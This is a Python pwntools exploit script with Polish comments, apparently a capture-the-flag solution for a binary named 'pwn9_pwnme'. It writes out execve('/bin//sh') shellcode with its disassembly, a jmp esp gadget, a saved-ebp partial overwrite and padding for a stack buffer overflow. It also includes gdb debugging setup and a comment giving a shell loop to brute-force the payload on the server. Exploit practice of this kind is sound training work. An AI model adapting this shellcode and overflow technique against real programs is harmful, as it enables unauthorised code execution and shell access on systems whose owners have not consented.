#!/usr/bin/python
# -*- coding: utf-8 -*-

'''
~Gros
'''

from pwn import *
import re


DEBUG  = True

# przygotowanie payload
shellcode = '\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80'
'''
   0:   31 c0                   xor    eax,eax
   2:   99                      cdq    
   3:   b0 0b                   mov    al,0xb
   5:   52                      push   edx
   6:   68 2f 2f 73 68          push   0x68732f2f
   b:   68 2f 62 69 6e          push   0x6e69622f
  10:   89 e3                   mov    ebx,esp
  12:   52                      push   edx
  13:   89 e2                   mov    edx,esp
  15:   53                      push   ebx
  16:   89 e1                   mov    ecx,esp
  18:   cd 80                   int    0x80
'''

jmp_esp = 0x0804859f  # rop gadget: jmp esp

offset = 0x110
payload = p32(jmp_esp)
payload += shellcode
payload += p8(0x9c-6)  # LSB of ebp, aslr off -> 0xffffcb9c &buffer
payload = 'A'*(offset - len(payload) - 3) + payload


# do testowania, odpalamy binarke i gdb
if DEBUG:
    e = ELF('./pwn9_pwnme')
    context.arch = e.arch
    s = process('./pwn9_pwnme')

    context.terminal = ['gnome-terminal', '-e']
    breakpoints = ['0x804846f']
    gdb.attach(s.proc.pid  , exe='./pwn9_pwnme', execute='\n'.join(['b *'+x for x in breakpoints]))

    pause()
    s.recvuntil('Give me something to eat please\n')
    s.send(payload)
    s.interactive()


# zapis czystego payloadu
with open('pwn9_payload', 'w') as f:
    f.write(payload)

'''
teraz na serwerze uruchamiamy:
$ while true; do (cat pwn9_payload; cat)  | ./pwn9_pwnme ;done
trzymamy enter dopóki nie pyknie
jak ktoś wymyśli lepszy sposób na brutowanie - dać znać
'''